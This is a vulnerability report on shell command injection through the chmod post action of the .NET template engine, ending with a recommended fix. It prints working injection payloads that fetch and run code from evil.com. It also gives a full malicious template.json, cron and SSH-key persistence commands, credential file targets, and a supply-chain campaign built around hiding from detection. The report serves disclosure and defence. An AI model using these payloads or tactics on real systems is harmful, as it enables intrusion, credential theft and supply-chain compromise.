# F1: Shell Command Injection via Template Chmod Post-Action

## Vulnerability Classification

| Field | Value |
|-------|-------|
| Type | CWE-78: OS Command Injection |
| Severity | Critical (CVSS 3.1: 9.0+) |
| Attack Vector | Network (NuGet package distribution) |
| User Interaction | Required (victim runs `dotnet new`) |
| Privileges Required | None |
| Impact | Full user-level RCE, potential supply chain compromise |
| Affected Component | `Microsoft.TemplateEngine.Cli` |
| File | `src/Cli/Microsoft.TemplateEngine.Cli/PostActionProcessors/ChmodPostActionProcessor.cs` |

---

## 1. Code Path Verification

### The Injection Point

In `ChmodPostActionProcessor.cs` (lines 42-51), template-controlled values are interpolated directly into a shell command:

```csharp
Process? commandResult = System.Diagnostics.Process.Start(new ProcessStartInfo
{
    RedirectStandardError = false,
    RedirectStandardOutput = false,
    UseShellExecute = false,
    CreateNoWindow = false,
    WorkingDirectory = outputBasePath,
    FileName = "/bin/sh",
    Arguments = $"-c \"chmod {entry.Key} {file}\""
});
```

Both `entry.Key` and `file` originate from `actionConfig.Args`, which is an `IReadOnlyDictionary<string, string>` populated directly from the template.json `"args"` object. There is **zero sanitization** at any point in the data flow.

### Data Flow: template.json to Shell Execution

```
template.json "postActions"[].args
    |
    v
PostActionModel (deserialized from JSON, no validation on args keys/values)
    |
    v
IPostAction.Args (IReadOnlyDictionary<string, string>, passed through as-is)
    |
    v
PostActionDispatcher.Process() -- routes to ChmodPostActionProcessor
    |
    v  ** CRITICAL: No consent check **
PostActionProcessorBase.Process() (only validates outputBasePath is non-empty)
    |
    v
ChmodPostActionProcessor.ProcessInternal()
    |
    v
foreach (KeyValuePair<string, string> entry in actionConfig.Args)
    entry.Key  -->  interpolated as chmod mode argument
    entry.Value --> parsed as JSON array or single string --> each element interpolated as filename
    |
    v
/bin/sh -c "chmod {entry.Key} {file}"   <-- INJECTION
```

### The Consent Bypass (The Critical Amplifier)

In `PostActionDispatcher.cs` (lines 96-158), the `AllowRunScripts` consent mechanism is exclusively gated to `ProcessStartPostActionProcessor`:

```csharp
if (actionProcessor == null)
{
    // unknown processor - error
}
else if (actionProcessor is ProcessStartPostActionProcessor)  // line 123
{
    // Only THIS type gets the consent check
    if (canRunScripts == AllowRunScripts.No) { /* blocked */ }
    else if (canRunScripts == AllowRunScripts.Yes) { /* run */ }
    else if (canRunScripts == AllowRunScripts.Prompt) { /* ask user */ }
}
else // ALL OTHER post actions, including chmod    <-- line 155
{
    // Runs UNCONDITIONALLY, no prompt, no consent
    result |= ProcessAction(...);
}
```

The `--allow-scripts` CLI flag (default: `Prompt`) only controls the "Run script" post action (GUID `3A7C4B45-...`). The chmod post action (GUID `CB9A6CF3-...`) runs **automatically** with no user interaction whatsoever.

Even if a user passes `--allow-scripts no`, the chmod post action still executes.

### Both Injection Vectors

**Vector A: The Args Key (chmod mode string)**

The dictionary key is used as the chmod mode. A malicious template sets the key to a string containing shell metacharacters:

```json
"args": {
    "+x; curl http://evil.com/shell.sh | sh; #": "dummy.sh"
}
```

Resulting shell command:
```
/bin/sh -c "chmod +x; curl http://evil.com/shell.sh | sh; # dummy.sh"
```

**Vector B: The Args Value (filename string)**

The value is parsed as a JSON array or used as a single string. Each element becomes `file`:

```json
"args": {
    "+x": "dummy.sh; curl http://evil.com/shell.sh | sh"
}
```

Resulting shell command:
```
/bin/sh -c "chmod +x dummy.sh; curl http://evil.com/shell.sh | sh"
```

**Vector C: JSON Array Value**

```json
"args": {
    "+x": ["legit.sh", "$(curl http://evil.com/shell.sh|sh)"]
}
```

Resulting shell command:
```
/bin/sh -c "chmod +x $(curl http://evil.com/shell.sh|sh)"
```

---

## 2. End-to-End Attack Scenario

### Malicious template.json

```json
{
    "author": "Totally Legitimate Developer",
    "classifications": ["Web", "API", "Microservice"],
    "name": "Enterprise.Microservice.Template",
    "identity": "Enterprise.Microservice.Template",
    "shortName": "enterprise-api",
    "tags": {
        "language": "C#",
        "type": "project"
    },
    "sourceName": "EnterpriseApi",
    "postActions": [
        {
            "condition": "(OS != \"Windows_NT\")",
            "description": "Make scripts executable",
            "manualInstructions": [
                { "text": "Run 'chmod +x *.sh'" }
            ],
            "actionId": "cb9a6cf3-4f5c-4860-b9d2-03a574959774",
            "args": {
                "+x": ["entrypoint.sh", "$(curl -sL https://evil.com/p|sh)"]
            },
            "continueOnError": true
        },
        {
            "description": "Restore NuGet packages",
            "manualInstructions": [
                { "text": "Run 'dotnet restore'" }
            ],
            "actionId": "210D431B-A78B-4D2F-B762-4ED3E3EA9025",
            "continueOnError": true
        }
    ]
}
```

### Exact Shell Payload

The payload `$(curl -sL https://evil.com/p|sh)` is a command substitution that:

1. Downloads a second-stage script from an attacker-controlled server.
2. Pipes it directly to `sh` for execution.
3. The outer `chmod` command fails silently, but the subshell has already executed.
4. `continueOnError: true` ensures template creation proceeds normally, hiding evidence.

The second-stage payload (`https://evil.com/p`) can contain anything -- reverse shell, credential theft, backdoor installation.

### Victim Actions

**Scenario A: Direct install from NuGet.org**
```bash
dotnet new install Evil.Enterprise.Template
dotnet new enterprise-api -n MyProject
# RCE happens here, silently, during "Make scripts executable"
```

**Scenario B: Install from a GitHub repo / folder**
```bash
dotnet new install ./path/to/template/
dotnet new enterprise-api -n MyProject
# Same result
```

The victim does **not** need to confirm anything. The chmod post action runs automatically. Even `--allow-scripts no` does not prevent it.

### Permissions Obtained

- **User-level**: The shell command runs as the user who invoked `dotnet new`. No privilege escalation is needed because:
  - Developer machines typically have SSH keys, cloud credentials (AWS/Azure/GCP), GPG keys, and access tokens.
  - CI/CD runners often have deployment credentials, container registry access, and cloud IAM roles.
- **Potential root**: If `dotnet new` is run as root (common in Docker build stages), the attacker gets root.

### Blast Radius

| Context | Impact |
|---------|--------|
| Developer workstation | SSH keys, cloud creds, browser sessions, source code access |
| CI/CD pipeline (GitHub Actions, Azure DevOps, Jenkins) | Deployment keys, secrets, artifact signing keys, ability to inject into production builds |
| Docker build | Container escape potential if running privileged; at minimum, poisoned container image |
| Shared build server | Lateral movement to other projects/users |
| Template used by an org's internal "starter kit" | Every new project in the org is compromised from inception |

---

## 3. Attack Chaining

### Chain with AddJsonProperty Post Action

The `AddJsonPropertyPostActionProcessor` can modify any JSON file in the output directory or its parent directories (it searches upward). Combined:

1. **Chmod post action**: Achieves initial RCE.
2. **AddJsonProperty post action**: Modifies `global.json`, `.vscode/settings.json`, `launchSettings.json`, or `nuget.config` to:
   - Add a malicious NuGet source that serves backdoored packages.
   - Modify build properties to include malicious targets.
   - Alter VS Code settings to run attacker-controlled commands on file open.

Example chained `postActions`:
```json
[
    {
        "actionId": "cb9a6cf3-4f5c-4860-b9d2-03a574959774",
        "args": { "+x": ["$(curl -sL evil.com/p|sh)"] },
        "continueOnError": true
    },
    {
        "actionId": "695A3659-EB40-4FF5-A6A6-C9C4E629FCB0",
        "args": {
            "jsonFileName": "nuget.config",
            "parentPropertyPath": "configuration:packageSources",
            "newJsonPropertyName": "internal-mirror",
            "newJsonPropertyValue": "\"https://evil.com/nuget/v3/index.json\""
        },
        "continueOnError": true
    }
]
```

The AddJsonProperty action also runs with no consent check (same `else` branch in the dispatcher).

### Persistent Backdoors via Second-Stage Payload

The RCE payload can install any of:

1. **Cron job**: `echo "*/5 * * * * curl -sL evil.com/beacon|sh" | crontab -`
2. **Shell profile backdoor**: Append to `~/.bashrc`, `~/.zshrc`, or `~/.profile`
3. **SSH authorized_keys**: `mkdir -p ~/.ssh && echo "ssh-ed25519 AAAA... attacker" >> ~/.ssh/authorized_keys`
4. **Git hooks**: Plant a `post-commit` hook in the victim's repos to exfiltrate code or inject into every commit
5. **VS Code extensions**: Drop a malicious extension into `~/.vscode/extensions/`
6. **Systemd user service**: Create `~/.config/systemd/user/backdoor.service` for persistent reverse shell

### Propagation Capabilities

The second-stage payload can:

1. **Poison other repos**: Find git repos in `~/`, add malicious `.template.config/template.json` files, commit and push. If the victim is a template author, this creates a worm.
2. **Modify existing NuGet packages**: Alter `.csproj` files across the machine to include `<PackageReference>` to attacker-controlled packages.
3. **Inject into CI config**: Modify `.github/workflows/*.yml`, `.gitlab-ci.yml`, or `azure-pipelines.yml` to include attacker steps.
4. **Steal and reuse credentials**: Harvest `~/.nuget/NuGet.Config` (contains API keys), `~/.docker/config.json`, cloud credential files, and use them for further supply chain attacks.

### CI/CD Attack Surface

Many CI/CD pipelines run `dotnet new` for:
- Project scaffolding in automated project creation tools
- Template testing in template CI pipelines
- Bootstrapping microservices in infrastructure-as-code workflows
- Integration tests that create template projects

GitHub Actions example that is vulnerable:
```yaml
- name: Create project from template
  run: |
    dotnet new install OrgName.ServiceTemplate
    dotnet new org-service -n ${{ github.event.inputs.service-name }}
```

The chmod post action fires during `dotnet new` with the runner's credentials, which typically include `GITHUB_TOKEN` with write access to the repository.

---

## 4. Defense Assessment

### NuGet Template Installation Warnings

- `dotnet new install` from NuGet.org shows **no security warning** about post actions.
- The template is installed and its post actions are only revealed when `dotnet new <shortname>` is executed.
- There is no preview mechanism to see what post actions a template will run before installing it.
- The `--dry-run` flag shows a generic message "Action would have been taken automatically" but does not show the actual shell commands that would execute.

### Template Signing

- NuGet packages can be signed, but **template signing is not enforced**.
- NuGet.org does not require package signing.
- Even signed packages only prove authorship; a malicious author can sign their own malicious template.
- There is no allow-list or trust-on-first-use mechanism for template post actions.

### Sandboxing

- **There is no sandboxing.** The chmod post action runs `/bin/sh` directly as the current user.
- No seccomp, no AppArmor, no namespace isolation, no capability dropping.
- The `WorkingDirectory` is set to the output path, but the shell command has full access to the entire filesystem and network.
- The process inherits all environment variables, including credentials.

### What a Defender Would See

**Almost nothing.** Here is what evidence remains:

1. **Process tree**: A `/bin/sh -c "chmod ..."` child of the `dotnet` process. This looks completely normal for template instantiation -- the legitimate use of this post action also spawns the exact same process tree.
2. **Network activity**: If the payload uses `curl`/`wget`, there would be outbound connections. But these blend in with `dotnet restore` traffic that typically follows template creation.
3. **Console output**: If the chmod command fails, a single error line: "Unable to set permission '+x' for file 'xyz'". With `continueOnError: true`, template creation continues and succeeds normally. The user sees "Processing post actions" and then the normal success message.
4. **No logging**: The template engine does not log the exact shell commands it executes to any persistent log file. Verbose output (`-v`) would show some detail, but nobody runs template instantiation in verbose mode.

Detection difficulty: **Very High**. The attack uses a legitimate code path doing exactly what it was designed to do. The only anomaly is the content of the args, which is never inspected or logged at rest.

---

## 5. Complete Attack Narrative

### Phase 1: Template Crafting (Attacker)

The attacker creates a legitimate-looking NuGet template package. The template produces a real, functional project (e.g., an ASP.NET microservice with Docker support, Kubernetes manifests, and health checks). The template is genuinely useful -- this is not a suspicious empty package.

The attacker adds a chmod post action that looks nearly identical to the standard pattern used by hundreds of legitimate templates, with one critical difference: a command injection payload embedded in a filename.

```json
{
    "condition": "(OS != \"Windows_NT\")",
    "description": "Make scripts executable",
    "manualInstructions": [{ "text": "Run 'chmod +x *.sh'" }],
    "actionId": "cb9a6cf3-4f5c-4860-b9d2-03a574959774",
    "args": {
        "+x": ["entrypoint.sh", "health-check.sh", "$(curl -sL https://cdn-static.evil.com/d|bash)"]
    },
    "continueOnError": true
}
```

The payload URL uses a CDN-like domain to blend in with legitimate traffic. The `continueOnError: true` ensures the template still works even when the injected filename causes `chmod` to fail.

The second-stage script (`https://cdn-static.evil.com/d`) is tailored per target:
- Detects the environment (CI vs workstation vs container)
- Exfiltrates SSH keys, cloud credentials, NuGet API keys
- Installs a persistent backdoor appropriate to the environment
- Cleans up evidence (removes bash history entries, etc.)
- Exits cleanly with status 0

### Phase 2: Distribution (Attacker)

The attacker publishes the template to NuGet.org as `CoolStartup.Microservice.Template` or similar. They:

1. Create a professional README with badges, screenshots, and documentation
2. Add legitimate GitHub stars (or use a real-looking GitHub org)
3. Write blog posts and Stack Overflow answers recommending the template
4. Target specific communities (e.g., "Best .NET template for Kubernetes microservices")
5. Optionally, the attacker submits PRs to "awesome-dotnet" lists adding their template

Alternatively, for targeted attacks:
- Compromise an existing popular template's NuGet account
- Submit a PR to a company's internal template repository
- Typosquat a popular template name

### Phase 3: Victim Engagement

A developer finds the template and installs it:

```bash
$ dotnet new install CoolStartup.Microservice.Template
The following template packages will be installed:
   CoolStartup.Microservice.Template::2.1.0

Success! CoolStartup.Microservice.Template::2.1.0 installed the following templates:
Template Name         Short Name      Language
--------------------  --------------  --------
Microservice Starter  microservice    [C#]
```

No warnings. No indication of post actions.

### Phase 4: Exploitation

The developer creates a project:

```bash
$ dotnet new microservice -n OrderService
The template "Microservice Starter" was created successfully.

Processing post actions...
```

At this point, `/bin/sh` executes:
```
/bin/sh -c "chmod +x entrypoint.sh"
/bin/sh -c "chmod +x health-check.sh"
/bin/sh -c "chmod +x $(curl -sL https://cdn-static.evil.com/d|bash)"
```

The first two commands succeed normally. The third downloads and executes the attacker's payload. The `chmod` itself fails (the subshell output is not a valid filename), but the commands inside `$(...)` have already executed.

The template creation completes successfully. The developer sees their new project and starts working.

### Phase 5: Post-Exploitation

The second-stage payload has already:

1. **Exfiltrated credentials**: `~/.ssh/id_*`, `~/.aws/credentials`, `~/.azure/`, `~/.config/gcloud/`, `~/.nuget/NuGet.Config`
2. **Installed persistence**: A cron job that checks in every hour, or a modified `~/.bashrc` that loads a backdoor on every terminal open
3. **Planted git hooks**: A `post-commit` hook in the newly created project that will exfiltrate future code changes
4. **Modified VS Code settings**: If the developer uses VS Code, injected a task that runs on workspace open

### Phase 6: Lateral Movement and Supply Chain

Using the stolen credentials, the attacker can:

1. **Access cloud infrastructure**: AWS/Azure/GCP resources the developer has access to
2. **Push to repositories**: Using stolen SSH keys or tokens, inject backdoors into production code
3. **Compromise CI/CD**: Modify pipeline configurations to include attacker-controlled steps
4. **Publish malicious packages**: Using stolen NuGet API keys, push backdoored versions of the developer's own packages
5. **Access internal systems**: Using VPN credentials or SSO tokens found on the machine

If the template is adopted by an organization's internal "project starter" or "service template," every new project created from it is compromised from inception, and the attacker gains access to every developer who uses it.

---

## 6. Comparison with the "Run Script" Post Action

The contrast with `ProcessStartPostActionProcessor` makes the severity of this finding especially clear:

| Property | Run Script (3A7C4B45) | Chmod (CB9A6CF3) |
|----------|----------------------|-------------------|
| Consent required | Yes (`--allow-scripts`, default: Prompt) | **No** |
| User sees command before execution | Yes (shown in bold red) | **No** |
| Can be blocked with `--allow-scripts no` | Yes | **No** |
| Executes arbitrary shell commands | Yes, but only with consent | **Yes, unconditionally** |
| Uses `/bin/sh -c` | No (uses Process.Start with executable directly) | **Yes** |
| Input sanitization | Minimal (resolves path, uses Arguments not shell) | **None** |

The "Run Script" post action was recognized as dangerous and gated behind a consent mechanism. The chmod post action achieves the same result (arbitrary command execution via `/bin/sh`) but bypasses all protections because it was not recognized as being equally dangerous.

---

## 7. Recommended Fix

The fix should address both the injection vulnerability and the consent bypass:

1. **Do not use `/bin/sh -c`**. Call `chmod` directly via `Process.Start` with `FileName = "/bin/chmod"` and pass arguments as a proper argument array, or use `File.SetUnixFileMode()` (.NET 7+) to avoid spawning a subprocess entirely.

2. **Validate the mode argument**. The chmod mode should match `/^[ugoa]*[+-=][rwxXstugo]+$/` or a numeric mode like `/^[0-7]{3,4}$/`.

3. **Validate filenames**. Reject any filename containing shell metacharacters (`;`, `|`, `$`, `` ` ``, `(`, `)`, `&`, `>`, `<`, `\n`, etc.) or use the `GetTargetForSource` pattern from the base class to resolve filenames through the creation effects, preventing arbitrary strings from reaching the shell.

4. **Apply consent checks to chmod**. Add `ChmodPostActionProcessor` to the consent-gated path in `PostActionDispatcher`, or create a new category for "system-modifying" post actions that require consent.
